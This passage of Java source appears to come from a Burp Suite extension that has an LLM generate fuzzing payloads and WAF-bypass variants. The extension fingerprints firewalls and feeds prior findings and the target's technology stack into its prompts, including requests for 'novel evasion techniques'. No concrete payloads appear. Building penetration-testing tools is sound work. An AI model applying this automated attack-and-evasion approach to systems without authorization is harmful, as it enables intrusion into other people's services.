                    boolean blocked = isWafBlocked(response);

                    if (blocked) {
                        fp.blockedProbes.add(WAF_PROBE_LABELS[i]);
                        fp.wafDetected = true;
                        fp.blockStatus = status;
                        String body = response.response().bodyToString();
                        if (body != null && fp.blockBodyPattern.isEmpty()) {
                            // Extract first meaningful line of the block page
                            String trimmed = body.replaceAll("<[^>]+>", " ").trim();
                            fp.blockBodyPattern = truncate(trimmed, 100);
                        }
                        // Collect WAF-specific headers
                        for (var h : response.response().headers()) {
                            for (String wafHeader : WAF_INDICATOR_HEADERS) {
                                if (h.name().equalsIgnoreCase(wafHeader)) {
                                    fp.blockHeaders.add(h.name() + ": " + h.value());
                                }
                            }
                        }
                    } else {
                        fp.passedProbes.add(WAF_PROBE_LABELS[i]);
                    }
                }
            } catch (Exception e) {
                logError("WAF Fingerprint: Probe " + WAF_PROBE_LABELS[i] + " failed: " + e.getMessage());
            }
        }

        wafFingerprints.put(host, fp);
        logInfo("WAF Fingerprint: " + host + " — waf=" + fp.wafDetected
                + " passed=" + fp.passedProbes.size() + " blocked=" + fp.blockedProbes.size());
        return fp;
    }

    // ==================== Technology Stack Context (Improvement 3) ====================

    /**
     * Collects technology stack information from HTTP response headers and SharedDataBus.
     * Returns a text block to include in AI prompts.
     */
    private String buildTechStackContext(HttpRequestResponse reqResp) {
        StringBuilder tech = new StringBuilder();
        List<String> detectedTech = new ArrayList<>();

        if (reqResp != null && reqResp.response() != null) {
            for (var h : reqResp.response().headers()) {
                String name = h.name().toLowerCase();
                if ("server".equals(name)) detectedTech.add("Server: " + h.value());
                if ("x-powered-by".equals(name)) detectedTech.add("Framework: " + h.value());
                if ("x-aspnet-version".equals(name)) detectedTech.add("ASP.NET: " + h.value());
                if ("x-generator".equals(name)) detectedTech.add("Generator: " + h.value());
                // CDN/WAF indicators
                if ("cf-ray".equals(name)) detectedTech.add("CDN: Cloudflare");
                if ("x-amz-cf-id".equals(name)) detectedTech.add("CDN: CloudFront");
                if ("x-sucuri-id".equals(name)) detectedTech.add("WAF: Sucuri");
                if ("x-akamai-session".equals(name)) detectedTech.add("CDN: Akamai");
            }
        }

        // Pull technology findings from SharedDataBus if available
        if (sharedDataBus != null) {
            // Framework detections published by other scanners
            Set<String> frameworks = sharedDataBus.getSet("detected-frameworks");
            for (String fw : frameworks) detectedTech.add("Detected: " + fw);

            Set<String> databases = sharedDataBus.getSet("detected-databases");
            for (String db : databases) detectedTech.add("Database: " + db);

            Set<String> templateEngines = sharedDataBus.getSet("detected-templates");
            for (String te : templateEngines) detectedTech.add("Template engine: " + te);
        }

        // Pull from FindingsStore — look for existing findings that reveal technology
        if (findingsStore != null) {
            for (Finding f : findingsStore.getAllFindings()) {
                String title = f.getTitle().toLowerCase();
                if (title.contains("mysql")) detectedTech.add("Database: MySQL (from scan)");
                else if (title.contains("postgresql")) detectedTech.add("Database: PostgreSQL (from scan)");
                else if (title.contains("mssql") || title.contains("sql server"))
                    detectedTech.add("Database: MSSQL (from scan)");
                else if (title.contains("jinja2")) detectedTech.add("Template: Jinja2 (from scan)");
                else if (title.contains("angularjs")) detectedTech.add("Frontend: AngularJS (from scan)");
                if (detectedTech.size() > 15) break; // Cap to avoid bloating prompt
            }
        }

        // Deduplicate
        LinkedHashSet<String> unique = new LinkedHashSet<>(detectedTech);
        if (!unique.isEmpty()) {
            tech.append("TARGET TECHNOLOGY STACK:\n");
            for (String t : unique) tech.append("  - ").append(t).append("\n");
            tech.append("Use this information to generate technology-specific payloads.\n\n");
        }
        return tech.toString();
    }

    // ==================== Successful Payload Learning (Improvement 4) ====================

    /**
     * Records a confirmed finding in the scan session context.
     * Used to enrich future AI prompts with prior confirmed findings.
     */
    private void recordConfirmedFinding(String vulnType, String parameter, String url,
                                          String payload, String evidence) {
        ConfirmedFinding cf = new ConfirmedFinding(vulnType, parameter, url, payload, evidence,
                System.currentTimeMillis());
        sessionFindings.add(cf);
        // Keep only the last MAX_SESSION_FINDINGS
        while (sessionFindings.size() > MAX_SESSION_FINDINGS) {
            sessionFindings.remove(0);
        }
    }

    /**
     * Builds a prompt section listing previously confirmed findings for this scan session.
     */
    private String buildSessionFindingsContext() {
        if (sessionFindings.isEmpty()) return "";
        StringBuilder sb = new StringBuilder();
        sb.append("PREVIOUSLY CONFIRMED VULNERABILITIES ON THIS APPLICATION:\n");
        for (ConfirmedFinding cf : sessionFindings) {
            sb.append("  - ").append(cf.toPromptText()).append("\n");
        }
        sb.append("Prioritize similar vulnerability types and technology-specific payloads.\n\n");
        return sb.toString();
    }

    // ==================== Rate Limit Awareness (Improvement 6) ====================

    /**
     * Checks if we should pause before sending a request to this host.
     * Applies backoff if rate-limited. Returns false if IP is blocked.
     */
    private boolean waitForRateLimit(String url) {
        String host = extractHost(url);
        RateLimitTracker tracker = rateLimitTrackers.computeIfAbsent(host, k -> new RateLimitTracker());

        if (tracker.ipBlocked) {
            logInfo("Rate Limit: IP blocked for " + host + " — halting AI scan");
            findingsStore.addFinding(Finding.builder("ai-vuln-analyzer",
                            "AI Scan Halted — Target Blocking Detected", Severity.INFO, Confidence.FIRM)
                    .url(url)
                    .evidence("Target " + host + " appears to have blocked our IP after "
                            + fuzzRequestsSent.get() + " requests (5+ consecutive identical block responses).")
                    .description("[AI Rate Limit] Scan halted to avoid further blocking.")
                    .build());
            return false;
        }

        if (tracker.shouldPause()) {
            long waitMs = tracker.pauseUntil - System.currentTimeMillis();
            if (waitMs > 0) {
                logInfo("Rate Limit: Pausing " + waitMs + "ms for " + host);
                try { Thread.sleep(Math.min(waitMs, 120_000)); } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    return false;
                }
            }
        }
        return true;
    }

    /**
     * Records the response for rate limit tracking.
     */
    private void trackRateLimit(String url, HttpRequestResponse response) {
        if (response == null || response.response() == null) return;
        String host = extractHost(url);
        RateLimitTracker tracker = rateLimitTrackers.computeIfAbsent(host, k -> new RateLimitTracker());

        int status = response.response().statusCode();
        String body = response.response().bodyToString();
        String bodyHash = body != null ? String.valueOf(body.hashCode()) : "";

        tracker.recordResponse(status, bodyHash);

        if (status == 429) {
            String retryAfter = null;
            for (var h : response.response().headers()) {
                if ("retry-after".equalsIgnoreCase(h.name())) {
                    retryAfter = h.value();
                    break;
                }
            }
            tracker.applyBackoff(retryAfter);
            logInfo("Rate Limit: 429 received from " + host + " (consecutive: " + tracker.consecutive429s
                    + ", delay: " + tracker.currentDelayMs + "ms)");
        }
    }

    // ==================== Prompt Size Management (Improvement 7) ====================

    /**
     * Trims prompt context to fit within the token budget.
     * Strips boilerplate, truncates bodies, summarizes if needed.
     */
    private String trimToTokenBudget(String context, int charBudget) {
        if (context.length() <= charBudget) return context;

        // Step 1: Strip CSS blocks
        context = context.replaceAll("<style[^>]*>[\\s\\S]*?</style>", "[CSS removed]");
        if (context.length() <= charBudget) return context;

        // Step 2: Strip inline JS boilerplate (but keep src/urls)
        context = context.replaceAll("<script[^>]*>[\\s\\S]*?</script>", "[JS block removed]");
        if (context.length() <= charBudget) return context;

        // Step 3: Strip HTML tags (keep text content)
        context = context.replaceAll("<[^>]+>", " ");
        if (context.length() <= charBudget) return context;

        // Step 4: Collapse whitespace
        context = context.replaceAll("\\s+", " ");
        if (context.length() <= charBudget) return context;

        // Step 5: Hard truncate
        return context.substring(0, charBudget) + "\n[... truncated to fit token budget]";
    }

    /**
     * Strips boilerplate from an HTTP response body for inclusion in prompts.
     */
    private String stripResponseBoilerplate(String body, int maxLen) {
        if (body == null) return "";
        // Remove CSS and large JS blocks
        body = body.replaceAll("<style[^>]*>[\\s\\S]*?</style>", "");
        body = body.replaceAll("<script[^>]*>[\\s\\S]*?</script>", "");
        body = body.replaceAll("\\s+", " ");
        return truncate(body, maxLen);
    }

    // ==================== Structured Output Enforcement (Improvement 9) ====================

    /**
     * Calls the LLM with retry on malformed JSON. If the first response can't be parsed,
     * retries once with a stricter prompt before falling back to the raw response.
     */
    private String callWithRetry(String prompt) throws LlmException {
        String rawResponse = llmClient.call(prompt);
        trackTokenUsage(rawResponse);

        // Try to parse — if it works, return as-is
        String json = extractJson(rawResponse);
        if (json != null) {
            try {
                JsonParser.parseString(json);
                return rawResponse; // Valid JSON
            } catch (JsonSyntaxException ignored) {}
        }

        // Malformed JSON — retry with stricter instructions
        logInfo("Structured Output: First response had malformed JSON, retrying with stricter prompt...");
        String retryPrompt = prompt + "\n\nCRITICAL: Your previous response was not valid JSON. "
                + "You MUST respond with ONLY a JSON object. No markdown, no explanation, no code fences. "
                + "Start your response with { and end with }. Ensure all strings are properly escaped.";
        rawResponse = llmClient.call(retryPrompt);
        trackTokenUsage(rawResponse);
        return rawResponse;
    }

    // ==================== Cost Tracking (Improvement 10) ====================

    /**
     * Extracts token usage from the raw LLM response (if available in response metadata)
     * and updates running totals. For API backends, token counts come from response headers/body.
     */
    private void trackTokenUsage(String rawResponse) {
        totalApiCalls.incrementAndGet();
        // Estimate tokens from character count (rough: 1 token ≈ 4 chars)
        if (rawResponse != null) {
            long outputTokensEst = rawResponse.length() / 4;
            totalOutputTokens.addAndGet(outputTokensEst);
        }
        updateEstimatedCost();
    }

    /**
     * Tracks input token usage (estimated from prompt size).
     */
    private void trackInputTokens(String prompt) {
        if (prompt != null) {
            long inputTokensEst = prompt.length() / 4;
            totalInputTokens.addAndGet(inputTokensEst);
        }
    }

    private void updateEstimatedCost() {
        // Default pricing: Anthropic Claude Sonnet-level pricing as baseline
        // Input: $3/1M tokens, Output: $15/1M tokens
        double inputCost = (totalInputTokens.get() / 1_000_000.0) * 3.0;
        double outputCost = (totalOutputTokens.get() / 1_000_000.0) * 15.0;
        estimatedCostUsd = inputCost + outputCost;
    }

    // ==================== Payload Deduplication (Improvement 8) ====================

    /**
     * Builds a prompt section listing which payload categories the static scanner already tested.
     * Reads from FindingsStore to see which scan modules have already run against this target.
     */
    private String buildStaticScannerDedup(String url, String targetModuleId) {
        if (findingsStore == null || targetModuleId == null) return "";

        List<String> testedCategories = new ArrayList<>();
        String host = extractHost(url);

        // Check which modules have reported findings or scanned this host
        if (moduleRegistry != null) {
            for (ScanModule module : moduleRegistry.getAllModules()) {
                if ("ai-vuln-analyzer".equals(module.getId())) continue;
                // Check if this module's findings exist for this host
                String moduleId = module.getId();
                boolean hasFindings = false;
                for (Finding f : findingsStore.getAllFindings()) {
                    if (moduleId.equals(f.getModuleId()) && f.getUrl() != null
                            && extractHost(f.getUrl()).equals(host)) {
                        hasFindings = true;
                        break;
                    }
                }
                if (hasFindings) {
                    testedCategories.add(module.getName());
                }
            }
        }

        if (testedCategories.isEmpty()) return "";

        return "STATIC SCANNER CONTEXT: The following scanner modules have already tested this target: "
                + String.join(", ", testedCategories) + ". "
                + "Focus on novel evasion techniques and creative payloads the static scanners do not cover. "
                + "Avoid basic/obvious payloads that a rule-based scanner would already have sent.\n\n";
    }

    // ==================== LLM Response Parsing ====================

    private List<FuzzPayload> parseFuzzPayloads(String rawResponse) {
        List<FuzzPayload> payloads = new ArrayList<>();
        String json = extractJson(rawResponse);
        if (json == null) return payloads;

        try {
            JsonObject root = JsonParser.parseString(json).getAsJsonObject();
            JsonArray arr = root.getAsJsonArray("payloads");
            if (arr == null) return payloads;

            int limit = maxPayloadsPerRequest;
            for (JsonElement el : arr) {
                if (limit > 0 && payloads.size() >= limit) break;
                JsonObject obj = el.getAsJsonObject();
                payloads.add(new FuzzPayload(
                        getStr(obj, "parameter"),
                        getStr(obj, "injection_point"),
                        getStr(obj, "payload"),
                        getStr(obj, "attack_type"),
                        getStr(obj, "description")
                ));
            }
        } catch (Exception e) {
            logError("Failed to parse fuzz payloads: " + e.getMessage());
        }
        return payloads;
    }

    private List<WafBypass> parseWafBypasses(String rawResponse) {
        List<WafBypass> bypasses = new ArrayList<>();
        String json = extractJson(rawResponse);
        if (json == null) return bypasses;

        try {
            JsonObject root = JsonParser.parseString(json).getAsJsonObject();
            JsonArray arr = root.getAsJsonArray("bypasses");
            if (arr == null) return bypasses;

            int limit = maxPayloadsPerRequest;
            for (JsonElement el : arr) {
                if (limit > 0 && bypasses.size() >= limit) break;
                JsonObject obj = el.getAsJsonObject();
                bypasses.add(new WafBypass(
                        getStr(obj, "payload"),
                        getStr(obj, "technique"),
                        getStr(obj, "description")
                ));
            }
        } catch (Exception e) {
            logError("Failed to parse WAF bypasses: " + e.getMessage());
        }
        return bypasses;
    }

    /**
     * Formats fuzz results for the LLM adaptive prompt (Improvement 2: Response-aware).
     * Includes full HTTP response details: status, headers, and body (truncated).
     * Applies prompt size management (Improvement 7) to keep within budget.
     */
    private String formatResultsForLlm(List<FuzzResult> results) {
        StringBuilder sb = new StringBuilder();
        int i = 1;
        int charBudget = CONTEXT_CHAR_BUDGET;

        for (FuzzResult r : results) {
            StringBuilder entry = new StringBuilder();
            entry.append("--- Test ").append(i++).append(" ---\n");
            entry.append("Parameter: ").append(r.payload.parameter)
                    .append(" (").append(r.payload.injectionPoint).append(")\n");
            entry.append("Attack: ").append(r.payload.attackType).append("\n");
            entry.append("Payload: ").append(truncate(r.payload.payload, 300)).append("\n");
            entry.append("Response Time: ").append(r.responseTimeMs).append("ms\n");
            entry.append("WAF Blocked: ").append(r.wafDetected).append("\n");

            // Improvement 2: Include full response details for adaptive rounds
            if (r.response != null && r.response.response() != null) {
                entry.append("Status: ").append(r.response.response().statusCode()).append("\n");

                // Include key response headers
                entry.append("Response Headers: ");
                List<String> interestingHeaders = new ArrayList<>();
                for (var h : r.response.response().headers()) {
                    String name = h.name().toLowerCase();
                    if (name.equals("content-type") || name.equals("server") || name.equals("x-powered-by")
                            || name.equals("location") || name.equals("set-cookie")
                            || name.startsWith("x-waf") || name.startsWith("x-cdn")
                            || name.equals("cf-ray") || name.equals("www-authenticate")) {
                        interestingHeaders.add(h.name() + ": " + h.value());
                    }
                }
                entry.append(interestingHeaders.isEmpty() ? "(none relevant)" : String.join(" | ", interestingHeaders));
                entry.append("\n");

                // Include response body (stripped of boilerplate, Improvement 7)
                String body = r.response.response().bodyToString();
                entry.append("Response Body: ").append(stripResponseBoilerplate(body, RESPONSE_BODY_TRUNCATE)).append("\n");
            }
            entry.append("\n");

            // Improvement 7: Check if adding this entry exceeds the budget
            if (sb.length() + entry.length() > charBudget) {
                sb.append("[... ").append(results.size() - i + 1)
                        .append(" more results omitted — token budget reached]\n");
                break;
            }
            sb.append(entry);
        }
        return sb.toString();
    }

    // ==================== Data classes ====================

    private record FuzzPayload(String parameter, String injectionPoint,
                                String payload, String attackType, String description) {}

    private record FuzzResult(FuzzPayload payload, HttpRequestResponse response,
                               boolean wafDetected, long responseTimeMs) {}

    private record WafBypass(String payload, String technique, String description) {}

    /** WAF fingerprint collected by probing the target before fuzzing (Improvement 1). */
    static class WafFingerprint {
        boolean wafDetected;
        int blockStatus;
        String blockBodyPattern = "";
        final List<String> blockHeaders = new ArrayList<>();
        final List<String> passedProbes = new ArrayList<>();
        final List<String> blockedProbes = new ArrayList<>();
        long createdAt = System.currentTimeMillis();

        String toPromptText() {
            StringBuilder sb = new StringBuilder();
            sb.append("WAF FINGERPRINT (pre-scan probe results):\n");
            sb.append("  WAF Detected: ").append(wafDetected).append("\n");
            if (wafDetected) {
                sb.append("  Block Status: ").append(blockStatus).append("\n");
                if (!blockBodyPattern.isEmpty())
                    sb.append("  Block Body Pattern: ").append(blockBodyPattern).append("\n");
                if (!blockHeaders.isEmpty())
                    sb.append("  WAF Headers: ").append(String.join(", ", blockHeaders)).append("\n");
            }
            if (!passedProbes.isEmpty())
                sb.append("  Probes that PASSED (not blocked): ").append(String.join(", ", passedProbes)).append("\n");
            if (!blockedProbes.isEmpty())
                sb.append("  Probes that were BLOCKED: ").append(String.join(", ", blockedProbes)).append("\n");
            sb.append("  Strategy: Start with payload categories similar to those that passed. ")
                    .append("Avoid patterns similar to blocked probes unless using evasion techniques.\n");
            return sb.toString();
        }
    }

    /** Confirmed finding stored in the scan session context (Improvement 4). */
    private record ConfirmedFinding(String vulnType, String parameter, String url,
                                     String payload, String evidence, long timestamp) {
        String toPromptText() {
            return vulnType + " on " + url + " param='" + parameter + "' via: "
                    + (payload != null ? truncateStatic(payload, 100) : "N/A");
        }
    }

    /** Per-host rate limit tracker (Improvement 6). */
    static class RateLimitTracker {
        int consecutive429s = 0;
        int consecutiveBlockedSameHash = 0;
        String lastBlockBodyHash = "";
        long pauseUntil = 0;
        int currentDelayMs = 0;
        boolean ipBlocked = false;

        synchronized void recordResponse(int statusCode, String bodyHash) {
            if (statusCode == 429) {
                consecutive429s++;
            } else {
                consecutive429s = 0;
            }
            // Detect IP-level blocking: same status + same body hash for 5+ consecutive
            if (statusCode >= 400 && bodyHash != null && bodyHash.equals(lastBlockBodyHash)) {
                consecutiveBlockedSameHash++;
            } else {
                consecutiveBlockedSameHash = 0;
                lastBlockBodyHash = bodyHash != null ? bodyHash : "";
            }
            if (consecutiveBlockedSameHash >= 5) {
                ipBlocked = true;
            }
        }

        synchronized boolean shouldPause() {
            if (ipBlocked) return true;
            if (consecutive429s >= 3) return true;
            return System.currentTimeMillis() < pauseUntil;
        }

        synchronized void applyBackoff(String retryAfterHeader) {
            int delaySec = 60; // default
            if (retryAfterHeader != null) {
                try { delaySec = Integer.parseInt(retryAfterHeader.trim()); } catch (NumberFormatException ignored) {}
            }
            if (consecutive429s >= 5) {
                currentDelayMs = Math.max(currentDelayMs * 2, delaySec * 1000);
            } else {
                currentDelayMs = delaySec * 1000;
            }
            pauseUntil = System.currentTimeMillis() + currentDelayMs;
        }

        synchronized void reset() {
            consecutive429s = 0;
            consecutiveBlockedSameHash = 0;
            ipBlocked = false;
            pauseUntil = 0;
            currentDelayMs = 0;
        }
    }

    /** Token usage from a single API call (Improvement 10). */
    private record TokenUsage(long inputTokens, long outputTokens) {}

    // ==================== Filtering helpers ====================

    private boolean isStaticResource(String url) {
        if (url == null) return true;
        String lower = url.toLowerCase();
        int qIdx = lower.indexOf('?');
        String path = qIdx > 0 ? lower.substring(0, qIdx) : lower;
        for (String ext : SKIP_EXTENSIONS) {
            if (path.endsWith(ext)) return true;
        }
        return false;
    }

    private String getContentType(HttpRequestResponse reqRes) {
        if (reqRes.response() == null) return "";
        for (var h : reqRes.response().headers()) {
            if ("content-type".equalsIgnoreCase(h.name())) {
                return h.value().toLowerCase();
            }
        }
        return "";
    }

    private boolean shouldSkipContentType(String ct) {
        if (ct.isEmpty()) return false;
        for (String skip : SKIP_CONTENT_TYPES) {
            if (ct.startsWith(skip)) return true;
        }
        return false;
    }

    private String normalizePath(String url) {
        if (url == null) return "";
        try {
            java.net.URI uri = java.net.URI.create(url);
            String path = uri.getPath();
            if (path == null) return url;
            return path.replaceAll("/\\d+", "/{id}");
        } catch (Exception e) {
            return url;
        }
    }

    private Severity parseSeverity(String s) {
        if (s == null) return Severity.INFO;
        return switch (s.toUpperCase()) {
            case "CRITICAL" -> Severity.CRITICAL;
            case "HIGH" -> Severity.HIGH;
            case "MEDIUM" -> Severity.MEDIUM;
            case "LOW" -> Severity.LOW;
            default -> Severity.INFO;
        };
    }

    private String extractJson(String text) {
        if (text == null) return null;
        // Use "\n```" for closing fence to avoid matching backticks inside JSON string values
        int start = text.indexOf("```json");
        if (start >= 0) {
            start = text.indexOf('\n', start) + 1;
            int end = text.indexOf("\n```", start);
            if (end > start) return text.substring(start, end).trim();
        }
        start = text.indexOf("```");
        if (start >= 0) {
            start = text.indexOf('\n', start) + 1;
            int end = text.indexOf("\n```", start);
            if (end > start) {
                String block = text.substring(start, end).trim();
                if (block.startsWith("{")) return block;
            }
        }
        start = text.indexOf('{');
        int end = text.lastIndexOf('}');
        if (start >= 0 && end > start) {
            return text.substring(start, end + 1);
        }
        return null;
    }

    private String getStr(JsonObject obj, String key) {
        JsonElement el = obj.get(key);
        return (el != null && !el.isJsonNull()) ? el.getAsString() : "";
    }

    /** Set a callback to log events to the UI Activity Log. Args: (module, message) */
    public void setUiLogger(java.util.function.BiConsumer<String, String> logger) {
        this.uiLogger = logger;
    }

    private void logInfo(String message) {
        if (api != null) api.logging().logToOutput("[AI Analyzer] " + message);
        java.util.function.BiConsumer<String, String> logger = uiLogger;
        if (logger != null) logger.accept("AI Analyzer", message);
    }

    private void logError(String message) {
        if (api != null) api.logging().logToError("[AI Analyzer] " + message);
        java.util.function.BiConsumer<String, String> logger = uiLogger;
        if (logger != null) logger.accept("AI Analyzer", "ERROR: " + message);
    }

    private static String truncate(String s, int max) {
        if (s == null) return "";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }

    private static String truncateStatic(String s, int max) {
        if (s == null) return "";
        return s.length() > max ? s.substring(0, max) + "..." : s;
    }

    /** Extracts the host portion from a URL. */
    private static String extractHost(String url) {
        if (url == null) return "";
        try {
            java.net.URI uri = java.net.URI.create(url);
            return uri.getHost() != null ? uri.getHost() : url;
        } catch (Exception e) {
            // Fallback: try simple extraction
            int start = url.indexOf("://");
            if (start >= 0) start += 3; else start = 0;
            int end = url.indexOf('/', start);
            if (end < 0) end = url.indexOf('?', start);
            if (end < 0) end = url.length();
            String hostPort = url.substring(start, end);
            int colonIdx = hostPort.indexOf(':');
            return colonIdx > 0 ? hostPort.substring(0, colonIdx) : hostPort;
        }
    }

    // ==================== Public accessors ====================

    public LlmClient getLlmClient() { return llmClient; }

    /** Returns true if AI is configured and ready to use (connection mode is not NONE). */
    public boolean isAiConfigured() {
        return connectionMode != AiConnectionMode.NONE;
    }

    public AiConnectionMode getConnectionMode() { return connectionMode; }

    public void setConnectionMode(AiConnectionMode mode) {
        this.connectionMode = mode;
        this.llmClient.setConnectionMode(mode);
        if (mode == AiConnectionMode.NONE) {
            cancelAllScans();
        } else {
            // Re-enable scanning when a mode is selected
            cancelled = false;
        }
    }

    /**
     * Cancels all running and queued AI scans immediately.
     * Running LLM network calls will finish, but no further payloads will be sent.
     */
    public void cancelAllScans() {
        cancelled = true;
        // Purge all queued (not yet started) tasks
        if (llmExecutor instanceof java.util.concurrent.ThreadPoolExecutor tpe) {
            tpe.getQueue().clear();
        }
        if (fuzzExecutor instanceof java.util.concurrent.ThreadPoolExecutor tpe) {
            tpe.getQueue().clear();
        }
        logInfo("All AI scans cancelled. Queues cleared.");
    }

    public void setModuleRegistry(ModuleRegistry registry) { this.moduleRegistry = registry; }
    public ModuleRegistry getModuleRegistry() { return moduleRegistry; }

    public void setCollaboratorManager(CollaboratorManager manager) { this.collaboratorManager = manager; }

    public int getAnalyzedCount() { return analyzedCount.get(); }
    public int getFindingsCount() { return findingsCount.get(); }
    public int getErrorCount() { return errorCount.get(); }
    public int getFuzzRequestsSent() { return fuzzRequestsSent.get(); }
    public int getActiveScansRunning() { return activeScansRunning.get(); }

    public int getQueueSize() {
        int passive = 0, fuzz = 0;
        if (llmExecutor instanceof ThreadPoolExecutor tpe) {
            passive = tpe.getQueue().size();
        }
        if (fuzzExecutor instanceof ThreadPoolExecutor tpe) {
            fuzz = tpe.getQueue().size();
        }
        return passive + fuzz;
    }

    public void setMaxBodySize(int maxBodySize) {
        this.maxBodySize = Math.max(1000, Math.min(maxBodySize, 100000));
    }
    public int getMaxBodySize() { return maxBodySize; }

    /** Set max payloads per request. 0 = unlimited (AI decides when to stop). */
    public void setMaxPayloadsPerRequest(int max) { this.maxPayloadsPerRequest = Math.max(0, max); }
    public int getMaxPayloadsPerRequest() { return maxPayloadsPerRequest; }

    // Active scanning toggles
    public void setPassiveAnalysisEnabled(boolean enabled) { this.passiveAnalysisEnabled = enabled; }
    public boolean isPassiveAnalysisEnabled() { return passiveAnalysisEnabled; }

    public void setSmartFuzzingEnabled(boolean enabled) { this.smartFuzzingEnabled = enabled; }
    public boolean isSmartFuzzingEnabled() { return smartFuzzingEnabled; }

    public void setWafBypassEnabled(boolean enabled) { this.wafBypassEnabled = enabled; }
    public boolean isWafBypassEnabled() { return wafBypassEnabled; }

    public void setAdaptiveScanEnabled(boolean enabled) { this.adaptiveScanEnabled = enabled; }
    public boolean isAdaptiveScanEnabled() { return adaptiveScanEnabled; }

    /**
     * Manual scan from context menu — bypasses dedup and filtering.
     * Allows specifying exactly which AI capabilities to use.
     */
    public void manualScan(HttpRequestResponse reqResp, boolean passive,
                           boolean fuzz, boolean wafBypass, boolean adaptive) {
        manualScan(reqResp, passive, fuzz, wafBypass, adaptive, null, null);
    }

    /**
     * Manual scan with module-specific focus.
     * When targetModuleId is non-null, the AI prompts are scoped to that module's
     * vulnerability type only (e.g., SQLi only, XSS only) to reduce false positives.
     */
    public void manualScan(HttpRequestResponse reqResp, boolean passive,
                           boolean fuzz, boolean wafBypass, boolean adaptive,
                           String targetModuleId) {
        manualScan(reqResp, passive, fuzz, wafBypass, adaptive, targetModuleId, null);
    }

    /**
     * Manual scan with module-specific focus and optional parameter targeting.
     * When targetParameter is non-null, the AI is instructed to only generate
     * payloads for that specific parameter.
     */
    public void manualScan(HttpRequestResponse reqResp, boolean passive,
                           boolean fuzz, boolean wafBypass, boolean adaptive,
                           String targetModuleId, String targetParameter) {
        cancelled = false; // Reset cancellation for new scan

        // Run everything off the EDT — Burp blocks api.http().sendRequest() on Swing thread.
        // Use llmExecutor for the setup (re-fetch + capture) then submit analysis/fuzz tasks.
        try {
            llmExecutor.submit(() -> {
                activeScansRunning.incrementAndGet();
                try {
                    doManualScan(reqResp, passive, fuzz, wafBypass, adaptive, targetModuleId, targetParameter);
                } finally {
                    activeScansRunning.decrementAndGet();
                }
            });
        } catch (RejectedExecutionException e) {
            logError("Manual scan: Queue full, scan rejected for " + reqResp.request().url());
        }
    }

    private void doManualScan(HttpRequestResponse reqResp, boolean passive,
                               boolean fuzz, boolean wafBypass, boolean adaptive,
                               String targetModuleId) {
        doManualScan(reqResp, passive, fuzz, wafBypass, adaptive, targetModuleId, null);
    }

    private void doManualScan(HttpRequestResponse reqResp, boolean passive,
                               boolean fuzz, boolean wafBypass, boolean adaptive,
                               String targetModuleId, String targetParameter) {
        // Passive-only scan (no fuzzing) = analyzing response content (e.g., Client-Side Analyzer).
        // Always send a fresh request to get the latest JS/HTML, bypassing cache.
        // Also re-fetch for any scan where response is missing, empty, or 304.
        boolean passiveOnly = passive && !fuzz;
        boolean needsRefresh = passiveOnly || needsFreshResponse(reqResp);

        logInfo("Manual scan: target=" + (targetModuleId != null ? targetModuleId : "all")
                + " passive=" + passive + " fuzz=" + fuzz
                + (targetParameter != null ? " param=" + targetParameter : "")
                + " needsRefresh=" + needsRefresh + " url=" + reqResp.request().url());

        HttpRequestResponse effectiveReqResp = reqResp;
        if (needsRefresh) {
            logInfo("Manual scan: Sending fresh request to " + reqResp.request().url());
            try {
                HttpRequest freshReq = reqResp.request()
                        .withRemovedHeader("If-Modified-Since")
                        .withRemovedHeader("If-None-Match")
                        .withRemovedHeader("If-Unmodified-Since")
                        .withRemovedHeader("Cache-Control")
                        .withRemovedHeader("Pragma")
                        .withAddedHeader("Cache-Control", "no-cache")
                        .withAddedHeader("Pragma", "no-cache");
                effectiveReqResp = api.http().sendRequest(freshReq);
                if (effectiveReqResp.response() != null) {
                    logInfo("Manual scan: Got response — status " + effectiveReqResp.response().statusCode()
                            + ", body size: " + effectiveReqResp.response().bodyToString().length() + " chars");
                } else {
                    logError("Manual scan: Request sent but response is null");
                }
            } catch (Exception e) {
                logError("Manual scan: Failed to fetch response - " + e.getMessage());
                // Fall through with original reqResp
            }
        }

        final HttpRequestResponse finalReqResp = effectiveReqResp;
        CapturedHttpExchange exchange;
        try {
            exchange = CapturedHttpExchange.from(finalReqResp, maxBodySize);
        } catch (Exception e) {
            logError("Manual scan: Failed to capture exchange - " + e.getMessage());
            return;
        }

        if (passive) {
            // Already on llmExecutor thread — run analysis directly instead of re-submitting
            analyzeWithLlm(exchange, finalReqResp, targetModuleId);
        }
        if (fuzz) {
            try {
                final String paramTarget = targetParameter;
                fuzzExecutor.submit(() -> {
                    activeScansRunning.incrementAndGet();
                    try {
                        performSmartFuzzing(exchange, finalReqResp, wafBypass, adaptive, targetModuleId, paramTarget);
                    } finally {
                        activeScansRunning.decrementAndGet();
                    }
                });
            } catch (RejectedExecutionException ignored) {}
        }
    }

    /**
     * Checks if the response needs to be re-fetched (missing, empty body, or 304 cached).
     */
    private boolean needsFreshResponse(HttpRequestResponse reqResp) {
        if (reqResp.response() == null) return true;
        int status = reqResp.response().statusCode();
        if (status == 304) return true;
        String body = reqResp.response().bodyToString();
        return body == null || body.isEmpty();
    }

    /** Clears dedup map so endpoints can be re-analyzed. */
    public void resetDedup() {
        analyzed.clear();
    }

    // ==================== Batch Scan ====================

    /** Returns the normalized URL path (no query/fragment) for dedup purposes. */
    private static String batchDedupeKey(HttpRequestResponse rr) {
        if (rr == null || rr.request() == null) return null;
        String url = rr.request().url();
        if (url == null) return null;
        int hashIdx = url.indexOf('#');
        if (hashIdx > 0) url = url.substring(0, hashIdx);
        int qIdx = url.indexOf('?');
        if (qIdx > 0) url = url.substring(0, qIdx);
        return url;
    }

    /** Returns true if an entry with the same URL path is already in the batch queue. */
    private boolean batchQueueContains(String dedupeKey) {
        if (dedupeKey == null) return false;
        for (HttpRequestResponse existing : batchQueue) {
            String existingKey = batchDedupeKey(existing);
            if (dedupeKey.equals(existingKey)) return true;
        }
        return false;
    }

    /** Adds a request to the batch queue. Returns the new queue size. Capped at MAX_BATCH_QUEUE_SIZE. Deduplicates by URL path. */
    public int addToBatchQueue(HttpRequestResponse reqResp) {
        if (batchQueue.size() >= MAX_BATCH_QUEUE_SIZE) {
            logInfo("Batch queue full (" + MAX_BATCH_QUEUE_SIZE + "). Remove items or run the scan first.");
            return batchQueue.size();
        }
        String key = batchDedupeKey(reqResp);
        if (batchQueueContains(key)) {
            return batchQueue.size();
        }
        batchQueue.add(reqResp);
        return batchQueue.size();
    }

